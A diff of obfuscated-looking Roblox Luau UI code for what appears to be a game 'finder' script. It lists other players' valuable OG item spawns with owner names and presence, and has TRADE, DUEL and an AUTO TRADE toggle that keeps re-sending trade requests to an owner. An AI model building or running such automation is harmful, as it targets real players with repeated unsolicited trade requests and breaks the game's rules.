+            aceFinderRuntime.RefreshOGModeVisuals(arg2)
+            aceFinderRuntime.RefreshFilters()
+          end
+
+          local function fn47(parent, arg, arg2)
+            local frame3 = Instance.new("Frame")
+            local n36 = flag15 and 34 or 38
+            local n37 = flag15 and 46 or 50
+            local n38 = n36 + 6 + n37
+            frame3.Size = UDim2.new(1, -12, 0, n38)
+            frame3.BackgroundTransparency = 1
+            frame3.BorderSizePixel = 0
+            frame3.LayoutOrder = -1
+            frame3.Parent = parent
+            local frame4 = Instance.new("Frame")
+            frame4.Name = "Header"
+            frame4.Size = UDim2.new(1, 0, 0, n36)
+            frame4.BackgroundColor3 = tbl21.PhotoBG
+            frame4.BorderSizePixel = 0
+            frame4.Parent = frame3
+            fn35(frame4, 10)
+            createUIStroke2(frame4, Color3.fromRGB(48, 50, 58), 1, 0.25)
+            local frame5 = Instance.new("Frame")
+            frame5.Name = "BrainrotWheel"
+            frame5.Size = UDim2.new(1, 0, 0, n37)
+            frame5.Position = UDim2.fromOffset(0, n36 + 6)
+            frame5.BackgroundColor3 = tbl21.PhotoBG
+            frame5.BorderSizePixel = 0
+            frame5.Parent = frame3
+            fn35(frame5, 8)
+            local scrollingFrame = Instance.new("ScrollingFrame")
+            scrollingFrame.Size = UDim2.fromScale(1, 1)
+            scrollingFrame.BackgroundTransparency = 1
+            scrollingFrame.BorderSizePixel = 0
+            scrollingFrame.ScrollBarThickness = 0
+            scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.X
+            scrollingFrame.CanvasSize = UDim2.new()
+            scrollingFrame.ScrollingDirection = Enum.ScrollingDirection.X
+            scrollingFrame.Active = true
+            scrollingFrame.Parent = frame5
+            table.insert(tbl18, scrollingFrame)
+
+            scrollingFrame.Destroying:Connect(function()
+              local v83 = table.find(tbl18, scrollingFrame)
+
+              if v83 then
+                table.remove(tbl18, v83)
+              end
+            end)
+
+            local tbl28 = {}
+            local flag16 = false
+            local scrollingEnabled = true
+            local flag17 = false
+
+            local function fn48()
+              if not parent:IsA("ScrollingFrame") or not parent.Parent then
+                return
+              end
+              local flag18 = flag16 or next(tbl28) ~= nil
+
+              if flag18 and not flag17 then
+                scrollingEnabled = parent.ScrollingEnabled
+                parent.ScrollingEnabled = false
+                flag17 = true
+              elseif not flag18 and flag17 then
+                parent.ScrollingEnabled = scrollingEnabled
+                flag17 = false
+              end
+            end
+
+            local function fn49(arg3)
+              flag16 = arg3 == true
+              scrollingFrame:SetAttribute("Collapsed", flag16)
+              fn48()
+            end
+
+            local connection = service.InputChanged:Connect(function(input)
+              if input.UserInputType ~= Enum.UserInputType.MouseMovement then
+                return
+              end
+              local parent2 = frame3
+              local flag18
+
+              while true do
+                flag18 = true
+
+                if parent2 then
+                  if parent2:IsA("GuiObject") and not parent2.Visible then
+                    flag18 = false
+                    break
+                  elseif parent2:IsA("LayerCollector") then
+                    flag18 = parent2.Enabled
+                    break
+                  else
+                    parent2 = parent2.Parent
+                  end
+                else
+                  break
+                end
+              end
+
+              local value = select(1, GuiService:GetGuiInset())
+              local n39 = service:GetMouseLocation() - value
+              local absolutePosition = frame3.AbsolutePosition
+              local absoluteSize = frame3.AbsoluteSize
+              fn49(
+                flag18
+                  and n39.X >= absolutePosition.X
+                  and n39.X <= absolutePosition.X + absoluteSize.X
+                  and n39.Y >= absolutePosition.Y
+                  and n39.Y <= absolutePosition.Y + absoluteSize.Y
+              )
+            end)
+
+            frame3.MouseEnter:Connect(function()
+              fn49(true)
+            end)
+
+            frame3.MouseLeave:Connect(function()
+              fn49(false)
+            end)
+
+            local function fn50(input)
+              if input.UserInputType ~= Enum.UserInputType.Touch or tbl28[input] then
+                return
+              end
+
+              tbl28[input] = true
+              fn48()
+            end
+
+            local connection2 = service.InputEnded:Connect(function(input)
+              if not tbl28[input] then
+                return
+              end
+              tbl28[input] = nil
+              fn48()
+            end)
+
+            scrollingFrame.InputBegan:Connect(fn50)
+
+            scrollingFrame.Destroying:Connect(function()
+              connection2:Disconnect()
+              connection:Disconnect()
+
+              if flag17 and parent:IsA("ScrollingFrame") and parent.Parent then
+                parent.ScrollingEnabled = scrollingEnabled
+                flag17 = false
+              end
+            end)
+
+            local uiListLayout = Instance.new("UIListLayout")
+            uiListLayout.FillDirection = Enum.FillDirection.Horizontal
+            uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+            uiListLayout.Padding = UDim.new(0, 6)
+            uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+            uiListLayout.Parent = scrollingFrame
+            local tbl29 = {}
+            local tbl30 = {}
+            local str8 = ""
+            local flag18 = true
+            local visible = true
+            local fn51 = nil
+            local v83 = createTextLabel(
+              parent,
+              arg2 == "ONLINE" and "No matching online owners" or "Waiting for OG spawns...",
+              flag15 and 10 or 11,
+              tbl21.Dim,
+              Enum.Font.GothamMedium
+            )
+            v83.Name = tostring(arg2 or "LIVE") .. "Empty"
+            v83.Size = UDim2.new(1, -12, 0, 54)
+            v83.LayoutOrder = 1000000
+            v83.TextXAlignment = Enum.TextXAlignment.Center
+            v83.TextYAlignment = Enum.TextYAlignment.Center
+            v83.Visible = true
+            local v84 = flag15 and 72 or 84
+            local n39 = flag15 and 54 or 64
+            local n40 = n36 - 8
+
+            local function fn52(name, text, arg3)
+              local instance2 = Instance.new("TextButton")
+              instance2.Name = name
+              instance2.Size = UDim2.fromOffset(arg3, n40)
+              instance2.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
+              instance2.BorderSizePixel = 0
+              instance2.Text = text
+              instance2.TextSize = flag15 and 6 or 8
+              instance2.TextColor3 = tbl21.White
+              instance2.Font = Enum.Font.GothamBold
+              instance2.AutoButtonColor = false
+              instance2.Parent = frame4
+              fn35(instance2, 6)
+              createUIStroke2(instance2, Color3.fromRGB(66, 68, 78), 1, 0.25)
+              return instance2
+            end
+
+            local RarityMode = fn52("RarityMode", "RARITY", v84)
+            RarityMode.Position = UDim2.fromOffset(5, 4)
+            local CollapseFilters = fn52("CollapseFilters", "-", 30)
+            CollapseFilters.Position = UDim2.new(1, -35, 0, 4)
+            CollapseFilters.TextSize = flag15 and 12 or 14
+            local v85 = fn52("SortMode", "SORT", n39)
+            v85.Position = UDim2.new(1, -(40 + n39), 0, 4)
+            local textBox = Instance.new("TextBox")
+            textBox.Name = "SpawnSearch"
+            textBox.Size = UDim2.new(1, -(10 + v84 + n39 + 30 + 15), 0, n40)
+            textBox.Position = UDim2.fromOffset(5 + v84 + 5, 4)
+            textBox.BackgroundColor3 = Color3.fromRGB(16, 12, 15)
+            textBox.BorderSizePixel = 0
+            textBox.ClearTextOnFocus = false
+            textBox.PlaceholderText = "SEARCH"
+            textBox.PlaceholderColor3 = Color3.fromRGB(108, 110, 120)
+            textBox.Text = ""
+            textBox.TextColor3 = tbl21.White
+            textBox.TextSize = flag15 and 8 or 9
+            textBox.Font = Enum.Font.GothamMedium
+            textBox.TextXAlignment = Enum.TextXAlignment.Left
+            textBox.Parent = frame4
+            fn35(textBox, 6)
+            createUIStroke2(textBox, Color3.fromRGB(66, 68, 78), 1, 0.25)
+            local instance2 = Instance.new("UIPadding")
+            instance2.PaddingLeft = UDim.new(0, 9)
+            instance2.PaddingRight = UDim.new(0, 7)
+            instance2.Parent = textBox
+
+            local function fn53(arg3)
+              local ogOnlyEnabled = finderUISettingsState.OGOnlyEnabled
+              RarityMode.Text = ogOnlyEnabled and "OG ONLY" or "ALL"
+
+              local tbl31 = {
+                BackgroundColor3 = ogOnlyEnabled and tbl21.White or Color3.fromRGB(18, 18, 22),
+                TextColor3 = ogOnlyEnabled and tbl21.BG or tbl21.White,
+              }
+
+              if arg3 then
+                fn34(RarityMode, tweenInfo, tbl31)
+              else
+                for k, v86 in pairs(tbl31) do
+                  RarityMode[k] = v86
+                end
+              end
+            end
+
+            table.insert(aceFinderRuntime.OGModeVisualRefreshers, fn53)
+            fn53(false)
+
+            RarityMode.MouseButton1Click:Connect(function()
+              aceFinderRuntime.SetOGOnlyEnabled(not finderUISettingsState.OGOnlyEnabled, true)
+            end)
+
+            v85.MouseButton1Click:Connect(function()
+              flag18 = not flag18
+              v85.Text = flag18 and "NEWEST" or "OLDEST"
+
+              if fn51 then
+                fn51()
+              end
+            end)
+
+            CollapseFilters.MouseButton1Click:Connect(function()
+              visible = not visible
+              frame5.Visible = visible
+              CollapseFilters.Text = visible and "-" or "+"
+              fn34(frame3, tweenInfo2, { Size = UDim2.new(1, -12, 0, visible and n38 or n36) })
+            end)
+
+            textBox:GetPropertyChangedSignal("Text"):Connect(function()
+              str8 = fn37(textBox.Text)
+
+              if fn51 then
+                fn51()
+              end
+            end)
+
+            fn51 = function()
+              local flag19 = false
+
+              for _, v86 in pairs(tbl30) do
+                if v86 then
+                  flag19 = true
+                  break
+                end
+              end
+
+              local n41 = 0
+
+              for _, v86 in ipairs(arg) do
+                local v87 = fn37(v86:GetAttribute("OwnerUsername") or "")
+                local v88 = fn37(v86:GetAttribute("OwnerDisplayName") or "")
+                local num = tonumber(v86:GetAttribute("Income")) or 0
+                v86.LayoutOrder = flag18 and -num or num
+                local flag20 = not finderUISettingsState.OGOnlyEnabled or v86:GetAttribute("IsOG") == true
+                local flag21 = str8 == "" or v87:find(str8, 1, true) ~= nil or v88:find(str8, 1, true) ~= nil
+                local flag22 = flag20 and flag21 and not flag19
+                local v89
+
+                if flag20 and flag21 and flag19 then
+                  for k, v90 in pairs(tbl30) do
+                    if v90 then
+                      local v91 = ipairs
+                      local match = tbl27[k].Match or {}
+
+                      for _, v92 in v91(match) do
+                        if v87 == fn37(v92) then
+                          flag22 = true
+                          break
+                        end
+                      end
+                    end
+
+                    if not flag22 then
+                      continue
+                    end
+                    break
+                  end
+
+                  v89 = flag22
+                else
+                  v89 = flag22
+                end
+
+                v86.Visible = v89
+
+                if v89 then
+                  n41 += 1
+                end
+              end
+
+              v83.Visible = n41 == 0
+
+              if str8 ~= "" or flag19 then
+                v83.Text = "No matching spawns"
+              elseif arg2 == "ONLINE" then
+                v83.Text = finderUISettingsState.OGOnlyEnabled and "No online OG owners" or "No online owners"
+              else
+                v83.Text = finderUISettingsState.OGOnlyEnabled and "Waiting for OG spawns..." or "Waiting for live spawns..."
+              end
+            end
+
+            local function fn54(arg3, arg4)
+              fn34(arg3.Button, tweenInfo, { BackgroundColor3 = arg4 and color or photoBG2 })
+              fn34(arg3.Stroke, tweenInfo, { Color = arg4 and Color3.fromRGB(255, 255, 255) or color3 })
+              fn34(arg3.Text, tweenInfo, { TextColor3 = arg4 and color2 or tbl21.Dim })
+              fn34(arg3.IconBack, tweenInfo, { BackgroundColor3 = arg4 and photoBG or photoBG3 })
+            end
+
+            local function fn55(arg3)
+              tbl30[arg3] = not tbl30[arg3]
+
+              for i, v86 in ipairs(tbl29) do
+                fn54(v86, tbl30[i] == true)
+              end
+
+              fn51()
+            end
+
+            for i, v86 in ipairs(tbl27) do
+              local textButton = Instance.new("TextButton")
+              textButton.LayoutOrder = i
+              textButton.Size = UDim2.fromOffset(flag15 and 92 or 112, flag15 and 34 or 42)
+              textButton.BackgroundColor3 = photoBG2
+              textButton.BorderSizePixel = 0
+              textButton.Text = ""
+              textButton.AutoButtonColor = false
+              textButton.Parent = scrollingFrame
+              textButton.InputBegan:Connect(fn50)
+              fn35(textButton, 8)
+              local v87 = createUIStroke2(textButton, color3, 1, 0)
+              local n41 = flag15 and 34 or 38
+              local frame6 = Instance.new("Frame")
+              frame6.Size = UDim2.fromOffset(n41, n41)
+              frame6.Position = UDim2.new(0, 10, 0.5, -(n41 / 2))
+              frame6.BackgroundColor3 = photoBG3
+              frame6.BorderSizePixel = 0
+              frame6.Parent = textButton
+              fn35(frame6, 10)
+              local frame7 = Instance.new("Frame")
+              frame7.Size = UDim2.new(1, -2, 1, -2)
+              frame7.Position = UDim2.fromOffset(1, 1)
+              frame7.BackgroundTransparency = 1
+              frame7.Parent = frame6
+              createViewportFrame(frame7, v86.Model, string.sub(v86.Label, 1, 1), nil, "baseidle")
+              local v88 = createTextLabel(textButton, v86.Label, flag15 and 8 or 10, tbl21.Dim, Enum.Font.GothamBold)
+              v88.Size = UDim2.new(1, -(flag15 and 46 or 52), 1, 0)
+              v88.Position = UDim2.fromOffset(flag15 and 42 or 49, 0)
+              v88.TextYAlignment = Enum.TextYAlignment.Center
+              v88.TextTruncate = Enum.TextTruncate.AtEnd
+              local tbl31 = { Button = textButton, Stroke = v87, Text = v88, IconBack = frame6 }
+              table.insert(tbl29, tbl31)
+
+              textButton.MouseEnter:Connect(function()
+                if not tbl30[i] then
+                  fn34(textButton, tweenInfo, { BackgroundColor3 = Color3.fromRGB(26, 26, 34) })
+                  fn34(v87, tweenInfo, { Color = Color3.fromRGB(128, 130, 140) })
+                  fn34(v88, tweenInfo, { TextColor3 = Color3.fromRGB(232, 232, 236) })
+                end
+              end)
+
+              textButton.MouseLeave:Connect(function()
+                if not tbl30[i] then
+                  fn54(tbl31, false)
+                end
+              end)
+
+              textButton.MouseButton1Click:Connect(function()
+                fn55(i)
+              end)
+            end
+
+            table.insert(aceFinderRuntime.FilterRefreshers, fn51)
+            fn51()
+            return frame3, fn51
+          end
+
+          fn42 = function(parent, arg, arg2, arg3, arg4, arg5)
+            local tbl28 = arg5 or {}
+            local num = tonumber(tbl28.OwnerUserId)
+            local v83 = "function"
+            local flag16 = type(arg2) == v83 and arg2 ~= "" and arg2 or nil
+            local instance2 = Instance.new("Frame")
+            instance2.Size = UDim2.new(1, -16, 0, flag15 and 84 or 88)
+            instance2.BackgroundColor3 = tbl21.Card
+            instance2.BackgroundTransparency = 0.38
+            instance2.BorderSizePixel = 0
+            instance2.Parent = parent
+            fn35(instance2, 14)
+            local v84 = createUIStroke2(instance2, Color3.fromRGB(108, 110, 120), 1)
+            fn43(instance2, v84)
+            instance2.BackgroundTransparency = 1
+            v84.Transparency = 1
+
+            task.defer(function()
+              if instance2.Parent then
+                local n36 = instance2:GetAttribute("Expired") == true and 0.52 or 0.38
+                instance2.BackgroundTransparency = 1
+                fn34(instance2, tweenInfo2, { BackgroundTransparency = n36 })
+                fn34(v84, tweenInfo2, { Transparency = 0 })
+              end
+            end)
+
+            local frame3 = Instance.new("Frame")
+            frame3.Size = UDim2.new(1, -6, 1, -6)
+            frame3.Position = UDim2.fromOffset(3, 3)
+            frame3.BackgroundTransparency = 1
+            frame3.BorderSizePixel = 0
+            frame3.Parent = instance2
+            fn35(frame3, 10)
+            local n36 = flag15 and 72 or 82
+            local n37 = flag15 and 17 or 19
+            local n38 = n37 * 3 + 8
+            local instance3 = Instance.new("Frame")
+            instance3.Size = UDim2.fromOffset(n38, n38)
+            instance3.Position = UDim2.new(1, -(n36 + n38 + 16), 0, 9)
+            instance3.BackgroundColor3 = tbl21.PhotoBG
+            instance3.BorderSizePixel = 0
+            instance3.Parent = frame3
+            fn35(instance3, 12)
+            local instance4 = Instance.new("Frame")
+            instance4.Size = UDim2.new(1, -6, 1, -6)
+            instance4.Position = UDim2.fromOffset(3, 3)
+            instance4.BackgroundTransparency = 1
+            instance4.Parent = instance3
+            fn39(instance4, { UID = tbl28.UID, BrainrotName = arg3, Mutation = arg4 }, string.sub(arg3 or "?", 1, 1))
+            local v85 = createTextLabel(instance3, "0:00", flag15 and 8 or 9, tbl21.White, Enum.Font.GothamBlack)
+            v85.Name = "SpawnAge"
+            v85.Size = UDim2.new(1, -6, 0, 14)
+            v85.AnchorPoint = Vector2.new(0.5, 0)
+            v85.Position = UDim2.new(0.5, 0, 0, 2)
+            v85.BackgroundColor3 = Color3.fromRGB(4, 4, 6)
+            v85.BackgroundTransparency = 0.12
+            v85.TextXAlignment = Enum.TextXAlignment.Center
+            v85.TextYAlignment = Enum.TextYAlignment.Center
+            v85.ZIndex = 6
+            fn35(v85, 6)
+
+            local function fn48(text, arg6, backgroundColor3, arg7, textColor3)
+              local instance5 = Instance.new("TextButton")
+              instance5.Size = UDim2.fromOffset(n36, n37)
+              instance5.Position = UDim2.new(1, -(n36 + 10), 0, arg6)
+              instance5.BackgroundColor3 = backgroundColor3
+              instance5.BorderSizePixel = 0
+              instance5.Text = text
+              instance5.TextSize = flag15 and 12 or 10
+              instance5.Font = Enum.Font.GothamBold
+              instance5.TextColor3 = textColor3 or tbl21.White
+              instance5.AutoButtonColor = false
+              instance5.Parent = frame3
+              fn35(instance5, 6)
+              return instance5, (createUIStroke2(instance5, arg7, 1, 0))
+            end
+
+            local white = tbl21.White
+            local trade, v86 = fn48("TRADE", 9, Color3.fromRGB(20, 20, 32), Color3.fromRGB(84, 86, 96), white)
+            local white2 = tbl21.White
+            local autoTrade, v87 = fn48("AUTO TRADE", 9 + n37 + 4, Color3.fromRGB(170, 50, 50), Color3.fromRGB(220, 95, 95), white2)
+            local white3 = tbl21.White
+            local duel, v88 = fn48("DUEL", 9 + (n37 + 6) * 2, Color3.fromRGB(28, 20, 24), Color3.fromRGB(84, 86, 96), white3)
+            local n39 = n38 + n36 + 30
+            local v89 = createTextLabel(frame3, arg3, flag15 and 11 or 13, tbl21.White, Enum.Font.GothamBold)
+            v89.Size = UDim2.new(1, -(16 + n39), 0, 16)
+            v89.Position = UDim2.fromOffset(16, 9)
+            v89.TextTruncate = Enum.TextTruncate.AtEnd
+            local frame4 = Instance.new("Frame")
+            frame4.Size = UDim2.fromOffset(7, 7)
+            frame4.Position = UDim2.fromOffset(16, 29)
+            frame4.BackgroundColor3 = num and Color3.fromRGB(92, 96, 108) or Color3.fromRGB(110, 112, 128)
+            frame4.BorderSizePixel = 0
+            frame4.Parent = frame3
+            fn35(frame4, 4)
+            local v90 = createTextLabel
+            local str8 = flag16 and "@" .. flag16 or "@unclaimed"
+            local n40 = flag15 and 10 or 10
+            local gotham = Enum.Font.Gotham
+            local v91 = v90(frame3, str8, n40, Color3.fromRGB(200, 158, 175), gotham)
+            v91.Size = UDim2.new(1, -(16 + n39 + 8), 0, 14)
+            v91.Position = UDim2.fromOffset(27, 8)
+            v91.TextTruncate = Enum.TextTruncate.AtEnd
+            local textButton = Instance.new("TextButton")
+            textButton.Size = UDim2.fromOffset(flag15 and 76 or 88, flag15 and 16 or 17)
+            textButton.Position = UDim2.fromOffset(16, 8)
+            textButton.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
+            textButton.BorderSizePixel = 0
+            textButton.Text = "COPY USERNAME"
+            textButton.TextSize = flag15 and 7 or 7
+            textButton.Font = Enum.Font.GothamBold
+            textButton.TextColor3 = tbl21.White
+            textButton.AutoButtonColor = false
+            textButton.Parent = frame3
+            fn35(textButton, 8)
+            local v92 = 1
+            local v93 = createUIStroke2(textButton, Color3.fromRGB(72, 74, 84), v92, 0)
+            local unclaimed = createTextLabel(frame3, "UNCLAIMED", flag15 and 7 or 8, tbl21.Dim, Enum.Font.GothamBold)
+            unclaimed.Name = "OwnerStatus"
+            unclaimed.Size = UDim2.fromOffset(flag15 and 58 or 66, flag15 and 16 or 16)
+            unclaimed.Position = UDim2.fromOffset(16 + (flag15 and 74 or 94), 49)
+            unclaimed.BackgroundColor3 = Color3.fromRGB(16, 16, 28)
+            unclaimed.BackgroundTransparency = 0.08
+            unclaimed.TextXAlignment = Enum.TextXAlignment.Center
+            unclaimed.TextYAlignment = Enum.TextYAlignment.Center
+            fn35(unclaimed, 8)
+            local v94 = 1
+            createUIStroke2(unclaimed, Color3.fromRGB(64, 40, 44), v94, 0.25)
+            local flag17 = false
+            local n41 = 0
+            local fn49 = nil
+
+            local function fn50(arg6)
+              local flag18 = flag17 and not num
+              local color4 = arg6 and Color3.fromRGB(52, 64, 120) or Color3.fromRGB(70, 210, 100)
+              local color5 = arg6 and Color3.fromRGB(190, 62, 62) or Color3.fromRGB(170, 50, 50)
+              local color6 = arg6 and Color3.fromRGB(140, 255, 150) or Color3.fromRGB(110, 240, 150)
+              local color7 = arg6 and Color3.fromRGB(200, 120, 120) or Color3.fromRGB(220, 95, 95)
+              local color8 = arg6 and Color3.fromRGB(204, 160, 58) or Color3.fromRGB(182, 140, 60)
+              arg6 = arg6 and Color3.fromRGB(255, 240, 126) or Color3.fromRGB(239, 193, 91)
+              local v95 = fn34
+              local tbl29 = {}
+              color8 = flag18 and color8
+
+              if color8 then
+                color4 = color8
+              else
+                local v96 = flag17
+
+                if not flag17 then
+                  color4 = v96
+                end
+
+                color4 = color4 or color5
+              end
+
+              tbl29.BackgroundColor3 = color4
+              v95(autoTrade, tweenInfo2, tbl29)
+              fn34(v87, tweenInfo2, { Color = flag18 and arg6 or flag17 and color6 or color7 })
+              autoTrade.Text = flag18 and "WAITING" or flag17 and "AUTO: ON" or "AUTO: OFF"
+            end
+
+            local function fn51(arg6, arg7)
+              flag17 = arg6 == true
+              n41 += 1
+
+              if not flag17 and tbl26 and tbl26.Button == autoTrade then
+                tbl26 = nil
+              end
+
+              fn50(arg7 == true)
+            end
+
+            local function fn52(arg6, arg7, arg8)
+              fn34(arg6, tweenInfo, { Color = arg8 and tbl21.White or Color3.fromRGB(84, 86, 96) })
+              fn34(arg7, tweenInfo, { BackgroundColor3 = arg8 and Color3.fromRGB(30, 30, 36) or Color3.fromRGB(28, 20, 24) })
+            end
+
+            local function fn53(arg6, arg7, arg8, text)
+              if not arg6 or not arg6.Parent then
+                return
+              end
+              local text2 = arg7 and "SENT"
+
+              if not text2 then
+                text2 = tostring(arg8 or "FAILED"):upper()
+              end
+
+              arg6.Text = text2
+              arg6.TextSize = #text2 > 10 and (flag15 and 6 or 7) or flag15 and 12 or 10
+              arg6.TextColor3 = arg7 and tbl21.Good or Color3.fromRGB(245, 95, 95)
+
+              task.delay(2.2, function()
+                if arg6 and arg6.Parent then
+                  arg6.Text = text
+                  arg6.TextSize = flag15 and 12 or 10
+                  arg6.TextColor3 = tbl21.White
+                end
+              end)
+            end
+
+            local flag18 = false
+
+            local function fn54(arg6)
+              if flag18 then
+                if arg6 then
+                  arg6(false, "BUSY", 1)
+                end
+
+                return
+              end
+
+              if not num then
+                fn53(trade, false, "WAITING", "TRADE")
+
+                if arg6 then
+                  arg6(false, "WAITING", 1)
+                end
+
+                return
+              end
+
+              flag18 = true
+              trade.Text = "SENDING"
+
+              sendTrade(num, function(arg7, arg8, arg9)
+                flag18 = false
+                fn53(trade, arg7, arg8, "TRADE")
+
+                if arg6 then
+                  arg6(arg7, arg8, arg9)
+                end
+              end)
+            end
+
+            fn49 = function(arg6)
+              local v95 = n41
+
+              task.delay(math.max(0, tonumber(arg6) or 0), function()
+                if not aceFinderRuntime.Running or not instance2.Parent or not flag17 or v95 ~= n41 then
+                  return
+                end
+
+                fn54(function(arg7, arg8, arg9)
+                  if not flag17 or v95 ~= n41 or not instance2.Parent then
+                    return
+                  end
+                  fn49(math.max(26, tonumber(arg9) or 0))
+                end)
+              end)
+            end
+
+            local flag19 = false
+
+            local function fn55()
+              if flag19 then
+                return
+              end
+
+              if not num then
+                fn53(duel, false, "WAITING", "DUEL")
+                return
+              end
+              flag19 = true
+              duel.Text = "SENDING"
+
+              sendDuel(num, function(arg6, arg7)
+                flag19 = false
+                fn53(duel, arg6, arg7, "DUEL")
+              end)
+            end
+
+            textButton.MouseButton1Click:Connect(function()
+              local v95 = flag16 and fn36(flag16)
+              textButton.Text = v95 and "COPIED" or flag16 and "COPY FAILED" or "NO USER"
+              textButton.TextColor3 = v95 and tbl21.Good or tbl21.White
+
+              task.delay(1.5, function()
+                if textButton and textButton.Parent then
+                  textButton.Text = "COPY USERNAME"
+                  textButton.TextColor3 = tbl21.White
+                end
+              end)
+            end)
+
+            textButton.MouseEnter:Connect(function()
+              fn52(v93, textButton, true)
+            end)
+
+            textButton.MouseLeave:Connect(function()
+              fn52(v93, textButton, false)
+            end)
+
+            trade.MouseEnter:Connect(function()
+              fn52(v86, trade, true)
+            end)
+
+            trade.MouseLeave:Connect(function()
+              fn52(v86, trade, false)
+            end)
+
+            trade.MouseButton1Click:Connect(function()
+              fn54()
+            end)
+
+            duel.MouseEnter:Connect(function()
+              fn52(v88, duel, true)
+            end)
+
+            duel.MouseLeave:Connect(function()
+              fn52(v88, duel, false)
+            end)
+
+            duel.MouseButton1Click:Connect(fn55)
+
+            autoTrade.MouseButton1Click:Connect(function()
+              if flag17 then
+                fn51(false, false)
+                return
+              end
+
+              if tbl26 and tbl26.Button ~= autoTrade and tbl26.SetState then
+                tbl26.SetState(false, false)
+              end
+
+              tbl26 = { Button = autoTrade, SetState = fn51, Trigger = fn54 }
+              fn51(true, false)
+              fn49(0)
+            end)
+
+            autoTrade.MouseEnter:Connect(function()
+              fn50(true)
+            end)
+
+            autoTrade.MouseLeave:Connect(function()
+              fn50(false)
+            end)
+
+            local tbl29 = {
+              server = tbl21.Good,
+              ingame = tbl21.Good,
+              online = Color3.fromRGB(64, 64, 72),
+              studio = Color3.fromRGB(64, 64, 70),
+              offline = Color3.fromRGB(64, 64, 72),
+              unknown = Color3.fromRGB(92, 96, 110),
+            }
+
+            local tbl30
+
+            tbl30 = {
+              SetPresence = function(arg6)
+                frame4.BackgroundColor3 = tbl29[arg6] or tbl29.unknown
+
+                if not num then
+                  unclaimed.Text = "UNCLAIMED"
+                  unclaimed.TextColor3 = tbl21.Dim
+                elseif arg6 == "server" then
+                  unclaimed.Text = "IN SERVER"
+                  unclaimed.TextColor3 = tbl21.Good
+                elseif arg6 == "ingame" then
+                  unclaimed.Text = "IN GAME"
+                  unclaimed.TextColor3 = tbl21.Good
+                elseif arg6 == "online" or arg6 == "studio" then
+                  unclaimed.Text = "OFFLINE"
+                  unclaimed.TextColor3 = Color3.fromRGB(255, 105, 110)
+                else
+                  unclaimed.Text = "CLAIMED"
+                  unclaimed.TextColor3 = Color3.fromRGB(190, 192, 202)
+                end
+              end,
+              SetOwner = function(arg6, arg7)
+                num = tonumber(arg6)
+                flag16 = type(arg7) == "string" and arg7 ~= "" and arg7 or nil
+                v91.Text = flag16 and "@" .. flag16 or "@unclaimed"
+                instance2:SetAttribute("OwnerUsername", flag16 or "")
+                tbl30.SetPresence(num and "online" or "offline")
+
+                if num then
+                  local v95 = num
+
+                  task.spawn(function()
+                    local ok, result = pcall(function()
+                      return Players:GetNameFromUserIdAsync(v95)
+                    end)
+
+                    if ok and num == v95 and type(result) == "string" and result ~= "" and instance2.Parent then
+                      flag16 = result
+                      v91.Text = "@" .. result
+                      instance2:SetAttribute("OwnerUsername", result)
+                      aceFinderRuntime.RefreshFilters()
+                    end
+                  end)
+
+                  if flag17 then
+                    n41 += 1
+                    fn50(false)
+                    fn49(0)
+                  end
+                end
+
+                aceFinderRuntime.RefreshFilters()
+              end,
+              SetExpired = function(arg6)
+                instance2:SetAttribute("Expired", arg6 == true)
+                instance2.BackgroundTransparency = arg6 and 0.52 or 0.38
+              end,
+              GetOwnerUserId = function()
+                return num
+              end,
+              SetSpawnAge = function(arg6)
+                local n42 = math.max(0, math.floor(tonumber(arg6) or 0))
+                v85.Text = string.format("%d:%02d", math.floor(n42 / 60), n42 % 60)
+              end,
+              Card = instance2,
+              TradeButton = trade,
+              DuelButton = duel,
+            }
+
+            instance2:SetAttribute("OwnerUsername", arg3)
+            instance2:SetAttribute("IsOG", tbl28.IsOG == true)
+            tbl30.SetOwner(num, flag16 or arg)
+            return instance2, tbl30
+          end
+
+          tbl24 = {}
+          tbl25 = {}
+          local live2
+          live2, v81 = fn47(live.Scroll, tbl24, "LIVE")
+          local online2
+          online2, v82 = fn47(online.Scroll, tbl25, "ONLINE")
+        end
+
+        do
+          local function fn43(arg, arg2)
+            table.insert(tbl18, arg)
+            local tbl26 = {}
+            local flag16 = false
+            local scrollingEnabled = true
+            local flag17 = false
+
+            local function fn44()
+              if not arg2:IsA("ScrollingFrame") or not arg2.Parent then
+                return
+              end
+              local flag18 = flag16 or next(tbl26) ~= nil
+
+              if flag18 and not flag17 then
+                scrollingEnabled = arg2.ScrollingEnabled
+                arg2.ScrollingEnabled = false
+                flag17 = true
+              elseif not flag18 and flag17 then
+                arg2.ScrollingEnabled = scrollingEnabled
+                flag17 = false
+              end
+            end
+
+            local function fn45(arg3)
+              flag16 = arg3 == true
+              arg:SetAttribute("PointerInsideFilter", flag16)
+              fn44()
+            end
+
+            arg.MouseEnter:Connect(function()
+              fn45(true)
+            end)
+
+            arg.MouseLeave:Connect(function()
+              fn45(false)
+            end)
+
+            local connection = service.InputChanged:Connect(function(input)
+              if input.UserInputType ~= Enum.UserInputType.MouseMovement then
+                return
+              end
+              local flag18 = true
+              local parent = arg
+
+              while parent do
+                if parent:IsA("GuiObject") and not parent.Visible then
+                  flag18 = false
+                  break
+                elseif parent:IsA("LayerCollector") then
+                  flag18 = parent.Enabled
+                  break
+                else
+                  parent = parent.Parent
+                end
+              end
+
+              local value = select(1, GuiService:GetGuiInset())
+              local n36 = service:GetMouseLocation() - value
+              local absolutePosition = arg.AbsolutePosition
+              local absoluteSize = arg.AbsoluteSize
+              fn45(
+                flag18
+                  and n36.X >= absolutePosition.X
+                  and n36.X <= absolutePosition.X + absoluteSize.X
+                  and n36.Y >= absolutePosition.Y
+                  and n36.Y <= absolutePosition.Y + absoluteSize.Y
+              )
+            end)
+
+            arg.InputBegan:Connect(function(input)
+              if input.UserInputType ~= Enum.UserInputType.Touch or tbl26[input] then
+                return
+              end
+              tbl26[input] = true
+              fn44()
+            end)
+
+            local connection2 = service.InputEnded:Connect(function(input)
+              if not tbl26[input] then
+                return
+              end
+              tbl26[input] = nil
+              fn44()
+            end)
+
+            arg.Destroying:Connect(function()
+              connection:Disconnect()
+              connection2:Disconnect()
+              local v83 = table.find(tbl18, arg)
+
+              if v83 then
+                table.remove(tbl18, v83)
+              end
+
+              if flag17 and arg2:IsA("ScrollingFrame") and arg2.Parent then
+                arg2.ScrollingEnabled = scrollingEnabled
+              end
+            end)
+          end
+
